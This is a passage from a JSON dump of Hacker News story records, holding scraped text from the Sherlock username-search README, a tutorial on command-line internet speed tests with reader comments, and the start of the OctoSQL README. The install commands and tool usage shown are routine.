        "url_text": "Hunt down social media accounts by username across social networks Installation | Usage | Docker Notes | Contributing Installation # clone the repo $ git clone https://github.com/sherlock-project/sherlock.git # change the working directory to sherlock $ cd sherlock # install the requirements $ python3 -m pip install -r requirements.txt Usage $ python3 sherlock --help usage: sherlock [-h] [--version] [--verbose] [--folderoutput FOLDEROUTPUT] [--output OUTPUT] [--tor] [--unique-tor] [--csv] [--site SITE_NAME] [--proxy PROXY_URL] [--json JSON_FILE] [--timeout TIMEOUT] [--print-all] [--print-found] [--no-color] [--browse] [--local] USERNAMES [USERNAMES ...] Sherlock: Find Usernames Across Social Networks (Version 0.14.0) positional arguments: USERNAMES One or more usernames to check with social networks. optional arguments: -h, --help show this help message and exit --version Display version information and dependencies. --verbose, -v, -d, --debug Display extra debugging information and metrics. --folderoutput FOLDEROUTPUT, -fo FOLDEROUTPUT If using multiple usernames, the output of the results will be saved to this folder. --output OUTPUT, -o OUTPUT If using single username, the output of the result will be saved to this file. --tor, -t Make requests over Tor; increases runtime; requires Tor to be installed and in system path. --unique-tor, -u Make requests over Tor with new Tor circuit after each request; increases runtime; requires Tor to be installed and in system path. --csv Create Comma-Separated Values (CSV) File. --site SITE_NAME Limit analysis to just the listed sites. Add multiple options to specify more than one site. --proxy PROXY_URL, -p PROXY_URL Make requests over a proxy. e.g. socks5://127.0.0.1:1080 --json JSON_FILE, -j JSON_FILE Load data from a JSON file or an online, valid, JSON file. --timeout TIMEOUT Time (in seconds) to wait for response to requests. Default timeout is infinity. A longer timeout will be more likely to get results from slow sites. On the other hand, this may cause a long delay to gather all results. --print-all Output sites where the username was not found. --print-found Output sites where the username was found. --no-color Don't color terminal output --browse, -b Browse to all results on default browser. --local, -l Force the use of the local data.json file. To search for only one user: To search for more than one user: python3 sherlock user1 user2 user3 Accounts found will be stored in an individual text file with the corresponding username (e.g user123.txt). Anaconda (Windows) Notes If you are using Anaconda in Windows, using 'python3' might not work. Use 'python' instead. Docker Notes If docker is installed you can build an image and run this as a container. docker build -t mysherlock-image . Once the image is built, sherlock can be invoked by running the following: docker run --rm -t mysherlock-image user123 The optional --rm flag removes the container filesystem on completion to prevent cruft build-up. See: https://docs.docker.com/engine/reference/run/#clean-up---rm The optional -t flag allocates a pseudo-TTY which allows colored output. See: https://docs.docker.com/engine/reference/run/#foreground Use the following command to access the saved results: docker run --rm -t -v \"$PWD/results:/opt/sherlock/results\" mysherlock-image -o /opt/sherlock/results/text.txt user123 The -v \"$PWD/results:/opt/sherlock/results\" options tell docker to create (or use) the folder results in the present working directory and to mount it at /opt/sherlock/results on the docker container. The -o /opt/sherlock/results/text.txt option tells sherlock to output the result. Or you can use \"Docker Hub\" to run sherlock: docker run theyahya/sherlock user123 Using docker-compose You can use the docker-compose.yml file from the repository and use this command: docker-compose run sherlock -o /opt/sherlock/results/text.txt user123 Contributing We would love to have you help us with the development of Sherlock. Each and every contribution is greatly valued! Here are some things we would appreciate your help on: Addition of new site support Bringing back site support of sites that have been removed in the past due to false positives [1] Please look at the Wiki entry on adding new sites to understand the issues. Tests Thank you for contributing to Sherlock! Before creating a pull request with new development, please run the tests to ensure that everything is working great. It would also be a good idea to run the tests before starting development to distinguish problems between your environment and the Sherlock software. The following is an example of the command line to run all the tests for Sherlock. This invocation hides the progress text that Sherlock normally outputs, and instead shows the verbose output of the tests. $ cd sherlock/sherlock $ python3 -m unittest tests.all --verbose Note that we do currently have 100% test coverage. Unfortunately, some of the sites that Sherlock checks are not always reliable, so it is common to get response problems. Any problems in connection will show up as warnings in the tests instead of true errors. If some sites are failing due to connection problems (site is down, in maintenance, etc) you can exclude them from tests by creating a tests/.excluded_sites file with a list of sites to ignore (one site name per line). Stargazers over time License MIT Sherlock Project Original Creator - Siddharth Dushantha ",
        "_version_": 1718527438146764800
      },
      {
        "story_id": [21572308],
        "story_author": ["dragondax"],
        "story_descendants": [47],
        "story_score": [98],
        "story_time": ["2019-11-19T12:23:01Z"],
        "story_title": "Run an Internet Speed Test from the Command Line",
        "search": [
          "Run an Internet Speed Test from the Command Line",
          "https://www.putorius.net/speed-test-command-line.html",
          "We have all used tools like speedtest.net to test upload and download speeds. Whether it was to test the WiFi in that coffee shop (I use my own tether, never unknown hot spots), preparing for a LAN party (do people still do that?), or just a step in troubleshooting, we have all been there. For one reason or another you simply think you are being cheated of bandwidth, so you want independent verification of your speeds. This typically means opening a browser and going to a website to test your connection. But what if you want to run a speed test on a remote server? In this article we will discuss running an internet speed test from the Linux command line, and skipping the browser. There is something about the raw efficiency of the command line that I am really attracted to. As I discussed in the article 5 Command Line Tool to Break Your Dependence on the GUI, I try my best to stay away from the browser. It usually creates an unnecessary distraction. The internet is designed to grab your attention like a laser pointer does to a cat. So lets get started, and figure out one more way to stay away from the GUI. Different Speed Test Packages There are a few different tools you can use to run a speed test from the command line. To make things even more confusing the two most popular share the same exact name, but both use the speedtest.net service. Unofficial Speedtest-CLI Python Script The first one is an independently written Python script that is simple to install and use. It is available in the default repositories for some popular Linux distributions. Pros: Easy to installWide AvailabilityFull list of serversCan specify upload test, download test, or both Cons: Minimal output format optionsNo verbose output option Jump to Installing speedtest-cli Python Script or How to Use speedtest-cli Python Script. Official Ookla Speedtest CLI The second tool is built by Ookla, the people who bring you the speedtest.net website and service. Installing it requires you to add a repo for your package manager. But the maintainers offer simple instructions for installation. Pros: Official release from OoklaMore robust formatting optionsOutput easier to read, better layoutVerbose output availableHas repo making it easy to get updates Cons: Use limited to nearby serversCannot specify download or upload only Jump to Official Ookla Speedtest CLI The Speedtest-cli Python Script This is an easy way to get started running a speed test on the Linux command line. Installing the Speedtest-cli Python Script Simply use your package manager to install the package. Install on Fedora using DNF sudo dnf install speedtest-cli Ubuntu or Debian using APT sudo apt-get install speedtest-cli CentOS/Red Hat 7 / 8 Unfortunately, CentOS does not offer the rpm in their repos. It can still be easily installed. Change to /usr/bin directory to make command available to all users: cd /usr/bin Install dependencies: sudo yum install -y python wget Fetch script from github: sudo wget https://raw.githubusercontent.com/sivel/speedtest-cli/master/speedtest.py -O speedtest-cli Make script executable: sudo chmod +x speedtest-cli Or just copy and paste the whole thing below as a single line: cd /usr/bin; sudo yum install -y python wget && wget https://raw.githubusercontent.com/sivel/speedtest-cli/master/speedtest.py -O speedtest-cli && sudo chmod +x speedtest-cli How to Use the Python Script to Run a Speed Test The most basic usage is to simply run the command. It will automatically select the best server based on ping responses. Speedtest-cli Python Script Options There are several options available to change the default behavior. Here we will outline the most popular options. List Available Speed Test Servers You can use the list option to find a list of available servers to run your test against. At the time of writing this list is pretty extensive with 8829 possible servers. NOTE: The servers are sorted by distance, closest first. [[emailprotected] ~]$ speedtest-cli --list Retrieving speedtest.net configuration 4847) Hotwire Fision (Philadelphia, PA, United States) [10.92 km] 10979) School District of Philadelphia (Philadelphia, PA, United States) [10.92 km] ...OUTPUT TRUNCATED... Specify Specific Server to Test Against Once you have found the server you want to test against, you can use the server <SERVER ID> to select it. The server ID is the first column in the output of the list option above. [[emailprotected] ~]$ speedtest-cli --server 4847 Retrieving speedtest.net configuration Testing from Verizon Fios (x.x.x.x) Retrieving speedtest.net server list Selecting best server based on ping Hosted by School District of Philadelphia (Philadelphia, PA) [10.92 km]: 25.033 ms Testing download speed.. Download: 384.07 Mbit/s Testing upload speed Upload: 417.93 Mbit/s Only Test Upload or Download Speeds The option is actually designed to exclude a test. But since there are only two options it is effectively the same as selecting only one. To run only the download test, you exclude the upload, and vice versa. [[emailprotected] ~]$ speedtest-cli --no-upload Retrieving speedtest.net configuration Testing from Verizon Fios (x.x.x.x) Retrieving speedtest.net server list Selecting best server based on ping Hosted by KamaTera INC (New Jersey, NJ) [62.36 km]: 19.785 ms Testing download speed.. Download: 600.89 Mbit/s Skipping upload test Format Output in JSON or CSV You can specify the output format in JSON or CSV. You also have the opton to use CSV with a custom delimiter. This is handy if you are going to use the output in some other script or application. [[emailprotected] ~]$ speedtest-cli --json {\"download\": 597726146.0529929, \"upload\": 562476134.8046777, \"ping\": 17.004, \"server\": {\"url\": \"http://speedtest.us-ny2.kamatera.com:8080/speedtest/upload.php\", \"lat\": \"40.0583\", \"lon\": \"-74.4057\", \"name\": \"New Jersey, NJ\", \"country\": \"United States\", \"cc\": \"US\", \"sponsor\": \"KamaTera INC\", \"id\": \"11612\" ...OUTPUT TRUNCATED... Using CSV with a custom delimiter. The default delimiter is a comma, which is implied by the name CSV. Here we use the csv-delimiter option to change the delimiter to a pipe character. [[emailprotected] ~]$ speedtest-cli --csv --csv-delimiter \"|\" 11612|KamaTera INC|New Jersey, NJ|2019-11-17T14:51:53.636981Z|62.35865439150934|8.546|588013638.8767571|512001168.48230773||x.x.x.x The Official Ookla Speedtest CLI The official Speedtest CLI (Command Line Interface) from Ookla is a little more robust. It has all of the options of the python script and more. There are also several output formats not available with the unofficial python script. Ooklas speedtest is also a little easier on the eyes. It spreads the information out which makes it easier to read and displays a neat little progress bar. A URL you can use to share the results is also displayed by default. Installing the Official Speedtest CLI Install Speedtest CLI on Ubuntu / Debian: The Speedtest CLI from Ookla is supported on Ubuntu (xenial & bionic) and Debian (jessie, stretch, buster). $ sudo apt-get install gnupg1 apt-transport-https dirmngr $ export INSTALL_KEY=379CE192D401AB61 $ export DEB_DISTRO=$(lsb_release -sc) $ sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys $INSTALL_KEY $ echo \"deb https://ookla.bintray.com/debian ${DEB_DISTRO} main\" | sudo tee /etc/apt/sources.list.d/speedtest.list $ sudo apt-get update $ sudo apt-get install speedtest Install Speedtest CLI on Fedora / Redhat / CentOS: Fedora has moved on to DNF for package management, but is still compatible with YUM. These instructions were tested on Fedora 31, CentOS 7 and Red Hat 8. $ sudo yum install wget $ wget https://bintray.com/ookla/rhel/rpm -O bintray-ookla-rhel.repo $ sudo mv bintray-ookla-rhel.repo /etc/yum.repos.d/ $ sudo yum install speedtest How to Use the Official Speedtest CLI Once installed you can simply call the utility by typing speedtest at the command line. This will give you all the default information that you would see on the web version of speedtest.net. Official Speedtest CLI Options The options available in the official release are more robust. Here we will outline the popular options and how to use them. List Available Speed Test Servers Using the -L (servers) option will give you a list of servers available to run a test against. This option will only show you servers that are nearby. What exactly determines nearby is undefined. But for me it looks like they are staying in the tri-state area (PA, NJ, DE). [[emailprotected] ~]$ speedtest -L Closest servers: ID Name Location Country 4847 Hotwire Fision Philadelphia, PA United States 10979 School District of Philadelphia Philadelphia, PA United States 9840 Comcast New Castle, DE United States 11612 KamaTera INC New Jersey, NJ United States ...OUTPUT TRUNCATED... Optionally, you can use the -o (host) option and specify the FQDN of the server instead of the ID. But oddly, I dont see a way to get the FQDN of the servers on the list. I am guessing this option is available for using a custom server. I havent found a way to list all servers. If you are looking to test against a server on the other side of the country, you will have to find it another way. Select Specific Server to Run Speed Test Against You can use the -s (server-id) option to select a server to use from the list. You must supply the server ID with this option. The server ID is the number in the first column of the list output above. [[emailprotected] ~]$ speedtest -s 4847 Speedtest by Ookla Server: Hotwire Fision - Philadelphia, PA (id = 4847) Change Unit Used for Speed Output The -u (unit) option can display the speed output in many different formats. Decimal prefix, bits per second: bps, kbps, Mbps, Gbps Decimal prefix, bytes per second: B/s, kB/s, MB/s, GB/s Binary prefix, bits per second: kibps, Mibps, Gibps Binary prefix, bytes per second: kiB/s, MiB/s, GiB/s [[emailprotected] ~]$ speedtest -u MiB/s Speedtest by Ookla Server: Hotwire Fision - Philadelphia, PA (id = 4847) ISP: Verizon Fios Latency: 10.67 ms ( 0.95 ms jitter) Download: 63.45 MiB/s (data used: 700.2 MiB) ...OUTPUT TRUNCATED... Output Formatting Options The Ookla Speedtest CLI offers decent options for output formats. Human Readable DefaultCSV Comma Separated ValueTSV Tab Separated ValueJSON JavaScript Object NotationJSONL JSON LinesJSON-PRETTY JSON Pretty Printed Here is an example using json-pretty. [[emailprotected] ~]$ speedtest -f json-pretty { \"type\": \"result\", \"timestamp\": \"2019-11-17T16:42:06Z\", \"ping\": { \"jitter\": 0.29899999999999999, \"latency\": 17.474 }, \"download\": { \"bandwidth\": 92184614, \"bytes\": 491967724, \"elapsed\": 5303 }, \"upload\": { \"bandwidth\": 45010100, \"bytes\": 313859035, \"elapsed\": 6714 }, ...OUTPUT TRUNCATED... Conclusion Running a speed test from the command line may not be something that is needed on a daily basis for most people. However, it may prove useful in some troubleshooting situations. In this article we cover how to run a speed test from the command line using two similar tools. The unofficial python script and the official Ookla Speedtest CLI. We discussed installing, using and setting options for each one. This should be enough to get you started. For more information on these tools, visit their respective home pages found in the resources section below. Resources and Links: Ookla Speedtest CLISpeedtest-cli (Python Version) on GitHub ",
          "Note that some ISPs prioritise traffic to known speedtest targets, turning off traffic shaping rules that might otherwise slow bulk transfers. When this happens it means you are testing the likely maximum throughput of your connection not necessarily the throughput you will see more generally.<p>This is why Netflix started fast.com - because it draws data from the same distribution points as their video streaming apps it means you can't prioritise the speedtest without also doing so for the video traffic or (more likely) you can't de-prioritise the video traffic without also getting bad scores in that particular speedtest. From Netflix's point of view it is an answer to people contacting support with \"my speedtest results are fine, the problem must be your servers\" when they are experiencing video lag/drops and other such problems and the issue is due to ISP traffic shaping or the ISP simply not having enough backhaul bandwidth.<p>A more reliable test might be taking part in a busy public torrent: that way you are testing against arbitrary locations so your ISP can't be setting different shaping rules for them. Just remember to throttle upstream when testing downstream and vice-versa or saturation in the other direction will slow control packets that will in turn give you lower results for the one you are testing. This may fall into another trap though: unless you limit the number of active streams it may be an unrealistic test as more generally most processes use a small number of streams (or just a single one), and if you limit the number of streams too much you might get a lower result because each swarm member you connect to may be fairly saturated and sharing its bandwidth amongst many connections.",
          "speedtest-cli is <i>garbage</i> if you have >100Mbps Speeds. The dev refuses to acknowledge this: <a href=\"https://github.com/sivel/speedtest-cli/issues/226\" rel=\"nofollow\">https://github.com/sivel/speedtest-cli/issues/226</a><p>Also not just me:\n<a href=\"https://github.com/sivel/speedtest-cli/issues/649\" rel=\"nofollow\">https://github.com/sivel/speedtest-cli/issues/649</a><p><a href=\"https://github.com/sivel/speedtest-cli/issues/648\" rel=\"nofollow\">https://github.com/sivel/speedtest-cli/issues/648</a><p><a href=\"https://github.com/sivel/speedtest-cli/issues/641\" rel=\"nofollow\">https://github.com/sivel/speedtest-cli/issues/641</a><p><a href=\"https://github.com/sivel/speedtest-cli/issues/616\" rel=\"nofollow\">https://github.com/sivel/speedtest-cli/issues/616</a><p><a href=\"https://github.com/sivel/speedtest-cli/issues/601\" rel=\"nofollow\">https://github.com/sivel/speedtest-cli/issues/601</a><p><a href=\"https://github.com/sivel/speedtest-cli/issues/588\" rel=\"nofollow\">https://github.com/sivel/speedtest-cli/issues/588</a><p><a href=\"https://github.com/sivel/speedtest-cli/issues/546\" rel=\"nofollow\">https://github.com/sivel/speedtest-cli/issues/546</a>"
        ],
        "story_type": ["Normal"],
        "url": "https://www.putorius.net/speed-test-command-line.html",
        "comments.comment_id": [21582731, 21583805],
        "comments.comment_author": ["dspillett", "virtuallynathan"],
        "comments.comment_descendants": [5, 4],
        "comments.comment_time": [
          "2019-11-20T10:49:21Z",
          "2019-11-20T13:46:04Z"
        ],
        "comments.comment_text": [
          "Note that some ISPs prioritise traffic to known speedtest targets, turning off traffic shaping rules that might otherwise slow bulk transfers. When this happens it means you are testing the likely maximum throughput of your connection not necessarily the throughput you will see more generally.<p>This is why Netflix started fast.com - because it draws data from the same distribution points as their video streaming apps it means you can't prioritise the speedtest without also doing so for the video traffic or (more likely) you can't de-prioritise the video traffic without also getting bad scores in that particular speedtest. From Netflix's point of view it is an answer to people contacting support with \"my speedtest results are fine, the problem must be your servers\" when they are experiencing video lag/drops and other such problems and the issue is due to ISP traffic shaping or the ISP simply not having enough backhaul bandwidth.<p>A more reliable test might be taking part in a busy public torrent: that way you are testing against arbitrary locations so your ISP can't be setting different shaping rules for them. Just remember to throttle upstream when testing downstream and vice-versa or saturation in the other direction will slow control packets that will in turn give you lower results for the one you are testing. This may fall into another trap though: unless you limit the number of active streams it may be an unrealistic test as more generally most processes use a small number of streams (or just a single one), and if you limit the number of streams too much you might get a lower result because each swarm member you connect to may be fairly saturated and sharing its bandwidth amongst many connections.",
          "speedtest-cli is <i>garbage</i> if you have >100Mbps Speeds. The dev refuses to acknowledge this: <a href=\"https://github.com/sivel/speedtest-cli/issues/226\" rel=\"nofollow\">https://github.com/sivel/speedtest-cli/issues/226</a><p>Also not just me:\n<a href=\"https://github.com/sivel/speedtest-cli/issues/649\" rel=\"nofollow\">https://github.com/sivel/speedtest-cli/issues/649</a><p><a href=\"https://github.com/sivel/speedtest-cli/issues/648\" rel=\"nofollow\">https://github.com/sivel/speedtest-cli/issues/648</a><p><a href=\"https://github.com/sivel/speedtest-cli/issues/641\" rel=\"nofollow\">https://github.com/sivel/speedtest-cli/issues/641</a><p><a href=\"https://github.com/sivel/speedtest-cli/issues/616\" rel=\"nofollow\">https://github.com/sivel/speedtest-cli/issues/616</a><p><a href=\"https://github.com/sivel/speedtest-cli/issues/601\" rel=\"nofollow\">https://github.com/sivel/speedtest-cli/issues/601</a><p><a href=\"https://github.com/sivel/speedtest-cli/issues/588\" rel=\"nofollow\">https://github.com/sivel/speedtest-cli/issues/588</a><p><a href=\"https://github.com/sivel/speedtest-cli/issues/546\" rel=\"nofollow\">https://github.com/sivel/speedtest-cli/issues/546</a>"
        ],
        "id": "c57cac88-9610-4a3a-bdba-01335b90e0b7",
        "url_text": "We have all used tools like speedtest.net to test upload and download speeds. Whether it was to test the WiFi in that coffee shop (I use my own tether, never unknown hot spots), preparing for a LAN party (do people still do that?), or just a step in troubleshooting, we have all been there. For one reason or another you simply think you are being cheated of bandwidth, so you want independent verification of your speeds. This typically means opening a browser and going to a website to test your connection. But what if you want to run a speed test on a remote server? In this article we will discuss running an internet speed test from the Linux command line, and skipping the browser. There is something about the raw efficiency of the command line that I am really attracted to. As I discussed in the article 5 Command Line Tool to Break Your Dependence on the GUI, I try my best to stay away from the browser. It usually creates an unnecessary distraction. The internet is designed to grab your attention like a laser pointer does to a cat. So lets get started, and figure out one more way to stay away from the GUI. Different Speed Test Packages There are a few different tools you can use to run a speed test from the command line. To make things even more confusing the two most popular share the same exact name, but both use the speedtest.net service. Unofficial Speedtest-CLI Python Script The first one is an independently written Python script that is simple to install and use. It is available in the default repositories for some popular Linux distributions. Pros: Easy to installWide AvailabilityFull list of serversCan specify upload test, download test, or both Cons: Minimal output format optionsNo verbose output option Jump to Installing speedtest-cli Python Script or How to Use speedtest-cli Python Script. Official Ookla Speedtest CLI The second tool is built by Ookla, the people who bring you the speedtest.net website and service. Installing it requires you to add a repo for your package manager. But the maintainers offer simple instructions for installation. Pros: Official release from OoklaMore robust formatting optionsOutput easier to read, better layoutVerbose output availableHas repo making it easy to get updates Cons: Use limited to nearby serversCannot specify download or upload only Jump to Official Ookla Speedtest CLI The Speedtest-cli Python Script This is an easy way to get started running a speed test on the Linux command line. Installing the Speedtest-cli Python Script Simply use your package manager to install the package. Install on Fedora using DNF sudo dnf install speedtest-cli Ubuntu or Debian using APT sudo apt-get install speedtest-cli CentOS/Red Hat 7 / 8 Unfortunately, CentOS does not offer the rpm in their repos. It can still be easily installed. Change to /usr/bin directory to make command available to all users: cd /usr/bin Install dependencies: sudo yum install -y python wget Fetch script from github: sudo wget https://raw.githubusercontent.com/sivel/speedtest-cli/master/speedtest.py -O speedtest-cli Make script executable: sudo chmod +x speedtest-cli Or just copy and paste the whole thing below as a single line: cd /usr/bin; sudo yum install -y python wget && wget https://raw.githubusercontent.com/sivel/speedtest-cli/master/speedtest.py -O speedtest-cli && sudo chmod +x speedtest-cli How to Use the Python Script to Run a Speed Test The most basic usage is to simply run the command. It will automatically select the best server based on ping responses. Speedtest-cli Python Script Options There are several options available to change the default behavior. Here we will outline the most popular options. List Available Speed Test Servers You can use the list option to find a list of available servers to run your test against. At the time of writing this list is pretty extensive with 8829 possible servers. NOTE: The servers are sorted by distance, closest first. [[emailprotected] ~]$ speedtest-cli --list Retrieving speedtest.net configuration 4847) Hotwire Fision (Philadelphia, PA, United States) [10.92 km] 10979) School District of Philadelphia (Philadelphia, PA, United States) [10.92 km] ...OUTPUT TRUNCATED... Specify Specific Server to Test Against Once you have found the server you want to test against, you can use the server <SERVER ID> to select it. The server ID is the first column in the output of the list option above. [[emailprotected] ~]$ speedtest-cli --server 4847 Retrieving speedtest.net configuration Testing from Verizon Fios (x.x.x.x) Retrieving speedtest.net server list Selecting best server based on ping Hosted by School District of Philadelphia (Philadelphia, PA) [10.92 km]: 25.033 ms Testing download speed.. Download: 384.07 Mbit/s Testing upload speed Upload: 417.93 Mbit/s Only Test Upload or Download Speeds The option is actually designed to exclude a test. But since there are only two options it is effectively the same as selecting only one. To run only the download test, you exclude the upload, and vice versa. [[emailprotected] ~]$ speedtest-cli --no-upload Retrieving speedtest.net configuration Testing from Verizon Fios (x.x.x.x) Retrieving speedtest.net server list Selecting best server based on ping Hosted by KamaTera INC (New Jersey, NJ) [62.36 km]: 19.785 ms Testing download speed.. Download: 600.89 Mbit/s Skipping upload test Format Output in JSON or CSV You can specify the output format in JSON or CSV. You also have the opton to use CSV with a custom delimiter. This is handy if you are going to use the output in some other script or application. [[emailprotected] ~]$ speedtest-cli --json {\"download\": 597726146.0529929, \"upload\": 562476134.8046777, \"ping\": 17.004, \"server\": {\"url\": \"http://speedtest.us-ny2.kamatera.com:8080/speedtest/upload.php\", \"lat\": \"40.0583\", \"lon\": \"-74.4057\", \"name\": \"New Jersey, NJ\", \"country\": \"United States\", \"cc\": \"US\", \"sponsor\": \"KamaTera INC\", \"id\": \"11612\" ...OUTPUT TRUNCATED... Using CSV with a custom delimiter. The default delimiter is a comma, which is implied by the name CSV. Here we use the csv-delimiter option to change the delimiter to a pipe character. [[emailprotected] ~]$ speedtest-cli --csv --csv-delimiter \"|\" 11612|KamaTera INC|New Jersey, NJ|2019-11-17T14:51:53.636981Z|62.35865439150934|8.546|588013638.8767571|512001168.48230773||x.x.x.x The Official Ookla Speedtest CLI The official Speedtest CLI (Command Line Interface) from Ookla is a little more robust. It has all of the options of the python script and more. There are also several output formats not available with the unofficial python script. Ooklas speedtest is also a little easier on the eyes. It spreads the information out which makes it easier to read and displays a neat little progress bar. A URL you can use to share the results is also displayed by default. Installing the Official Speedtest CLI Install Speedtest CLI on Ubuntu / Debian: The Speedtest CLI from Ookla is supported on Ubuntu (xenial & bionic) and Debian (jessie, stretch, buster). $ sudo apt-get install gnupg1 apt-transport-https dirmngr $ export INSTALL_KEY=379CE192D401AB61 $ export DEB_DISTRO=$(lsb_release -sc) $ sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys $INSTALL_KEY $ echo \"deb https://ookla.bintray.com/debian ${DEB_DISTRO} main\" | sudo tee /etc/apt/sources.list.d/speedtest.list $ sudo apt-get update $ sudo apt-get install speedtest Install Speedtest CLI on Fedora / Redhat / CentOS: Fedora has moved on to DNF for package management, but is still compatible with YUM. These instructions were tested on Fedora 31, CentOS 7 and Red Hat 8. $ sudo yum install wget $ wget https://bintray.com/ookla/rhel/rpm -O bintray-ookla-rhel.repo $ sudo mv bintray-ookla-rhel.repo /etc/yum.repos.d/ $ sudo yum install speedtest How to Use the Official Speedtest CLI Once installed you can simply call the utility by typing speedtest at the command line. This will give you all the default information that you would see on the web version of speedtest.net. Official Speedtest CLI Options The options available in the official release are more robust. Here we will outline the popular options and how to use them. List Available Speed Test Servers Using the -L (servers) option will give you a list of servers available to run a test against. This option will only show you servers that are nearby. What exactly determines nearby is undefined. But for me it looks like they are staying in the tri-state area (PA, NJ, DE). [[emailprotected] ~]$ speedtest -L Closest servers: ID Name Location Country 4847 Hotwire Fision Philadelphia, PA United States 10979 School District of Philadelphia Philadelphia, PA United States 9840 Comcast New Castle, DE United States 11612 KamaTera INC New Jersey, NJ United States ...OUTPUT TRUNCATED... Optionally, you can use the -o (host) option and specify the FQDN of the server instead of the ID. But oddly, I dont see a way to get the FQDN of the servers on the list. I am guessing this option is available for using a custom server. I havent found a way to list all servers. If you are looking to test against a server on the other side of the country, you will have to find it another way. Select Specific Server to Run Speed Test Against You can use the -s (server-id) option to select a server to use from the list. You must supply the server ID with this option. The server ID is the number in the first column of the list output above. [[emailprotected] ~]$ speedtest -s 4847 Speedtest by Ookla Server: Hotwire Fision - Philadelphia, PA (id = 4847) Change Unit Used for Speed Output The -u (unit) option can display the speed output in many different formats. Decimal prefix, bits per second: bps, kbps, Mbps, Gbps Decimal prefix, bytes per second: B/s, kB/s, MB/s, GB/s Binary prefix, bits per second: kibps, Mibps, Gibps Binary prefix, bytes per second: kiB/s, MiB/s, GiB/s [[emailprotected] ~]$ speedtest -u MiB/s Speedtest by Ookla Server: Hotwire Fision - Philadelphia, PA (id = 4847) ISP: Verizon Fios Latency: 10.67 ms ( 0.95 ms jitter) Download: 63.45 MiB/s (data used: 700.2 MiB) ...OUTPUT TRUNCATED... Output Formatting Options The Ookla Speedtest CLI offers decent options for output formats. Human Readable DefaultCSV Comma Separated ValueTSV Tab Separated ValueJSON JavaScript Object NotationJSONL JSON LinesJSON-PRETTY JSON Pretty Printed Here is an example using json-pretty. [[emailprotected] ~]$ speedtest -f json-pretty { \"type\": \"result\", \"timestamp\": \"2019-11-17T16:42:06Z\", \"ping\": { \"jitter\": 0.29899999999999999, \"latency\": 17.474 }, \"download\": { \"bandwidth\": 92184614, \"bytes\": 491967724, \"elapsed\": 5303 }, \"upload\": { \"bandwidth\": 45010100, \"bytes\": 313859035, \"elapsed\": 6714 }, ...OUTPUT TRUNCATED... Conclusion Running a speed test from the command line may not be something that is needed on a daily basis for most people. However, it may prove useful in some troubleshooting situations. In this article we cover how to run a speed test from the command line using two similar tools. The unofficial python script and the official Ookla Speedtest CLI. We discussed installing, using and setting options for each one. This should be enough to get you started. For more information on these tools, visit their respective home pages found in the resources section below. Resources and Links: Ookla Speedtest CLISpeedtest-cli (Python Version) on GitHub ",
        "_version_": 1718527436331679746
      },
      {
        "story_id": [20449610],
        "story_author": ["cube2222"],
        "story_descendants": [70],
        "story_score": [310],
        "story_time": ["2019-07-16T13:04:35Z"],
        "story_title": "Show HN: OctoSQL – Query and join multiple databases and files, written in Go",
        "search": [
          "Show HN: OctoSQL – Query and join multiple databases and files, written in Go",
          "https://github.com/cube2222/octosql",
          "OctoSQL is a query tool that allows you to join, analyse and transform data from multiple databases, streaming sources and file formats using SQL. OctoSQL is currently being rewritten on the redesign branch. Problems OctoSQL Solves You need to join / analyze data from multiple datasources. Think of enriching an Excel file by joining it with a PostgreSQL database. You need stream aggregates over time, with live output updates. Think of a live-updated leaderboard with cat images based on a \"like\" event stream. You need aggregate streams per time window, with live output updates. Think of a unique user count per hour, per country live summary. Table of Contents What is OctoSQL? Installation Quickstart Temporal SQL Features Watermarks Triggers Retractions Example Durability Configuration JSON CSV Excel Parquet PostgreSQL MySQL Redis Kafka Documentation Architecture Datasource Pushdown Operations Roadmap What is OctoSQL? OctoSQL is a SQL query engine which allows you to write standard SQL queries on data stored in multiple SQL databases, NoSQL databases, streaming sources and files in various formats trying to push down as much of the work as possible to the source databases, not transferring unnecessary data. OctoSQL does that by creating an internal representation of your query and later translating parts of it into the query languages or APIs of the source databases. Whenever a datasource doesn't support a given operation, OctoSQL will execute it in memory, so you don't have to worry about the specifics of the underlying datasources. OctoSQL also includes temporal SQL extensions, to operate ergonomically on streams and respect their event-time (not the current system-time when the records are being processed). With OctoSQL you don't need O(n) client tools or a large data analysis system deployment. Everything's contained in a single binary. Why the name? OctoSQL stems from Octopus SQL. Octopus, because octopi have many arms, so they can grasp and manipulate multiple objects, like OctoSQL is able to handle multiple datasources simultaneously. Installation Either download the binary for your operating system (Linux, OS X and Windows are supported) from the Releases page, or install using the go command line tool: GO111MODULE=on go get -u github.com/cube2222/octosql/cmd/octosql Quickstart Let's say we have a csv file with cats, and a redis database with people (potential cat owners). Now we want to get a list of cities with the number of distinct cat names in them and the cumulative number of cat lives (as each cat has up to 9 lives left). First, create a configuration file (Configuration Syntax) For example: dataSources: - name: cats type: csv config: path: \"~/Documents/cats.csv\" - name: people type: redis config: address: \"localhost:6379\" password: \"\" databaseIndex: 0 databaseKeyName: \"id\" Then, set the OCTOSQL_CONFIG environment variable to point to the configuration file. export OCTOSQL_CONFIG=~/octosql.yaml You can also use the --config command line argument. Finally, query to your hearts desire: octosql \"SELECT p.city, FIRST(c.name), COUNT(DISTINCT c.name) cats, SUM(c.livesleft) catlives FROM cats c JOIN people p ON c.ownerid = p.id GROUP BY p.city ORDER BY catlives DESC LIMIT 9\" Example output: +---------+--------------+------+----------+ | p.city | c.name_first | cats | catlives | +---------+--------------+------+----------+ | Warren | Zoey | 68 | 570 | | Gadsden | Snickers | 52 | 388 | | Staples | Harley | 54 | 383 | | Buxton | Lucky | 45 | 373 | | Bethany | Princess | 46 | 366 | | Noxen | Sheba | 49 | 361 | | Yorklyn | Scooter | 45 | 359 | | Tuttle | Toby | 57 | 356 | | Ada | Jasmine | 49 | 351 | +---------+--------------+------+----------+ You can choose between live-table batch-table live-csv batch-csv stream-json output formats. (The live-* types will update the terminal view repeatedly every second, the batch-* ones will write the output once before exiting, the stream-* ones will print records whenever they are available) Temporal SQL Features OctoSQL features temporal SQL extensions inspired by the paper One SQL to Rule Them All. Introduction Often when you're working with streams of events, you'd like to use the time dimension somehow: Calculate average values for a day sliced by hours. Get unique user counts per day. and others All those examples have one thing in common: The time value of an event is crucial for correctness. A naive system could just use the current clock time whenever it receives an event. The correctness of this approach however, degrades quickly in the face of network problems, delivery delays, clock skew. This can be solved by using a value from the event as its time value. A new problem arises though: how do I know that I've received all events up to time X and can publish results for a given hour. You never know if there isn't somewhere a delayed event which should be factored in. This is where watermarks come into play. Watermarks Watermarks 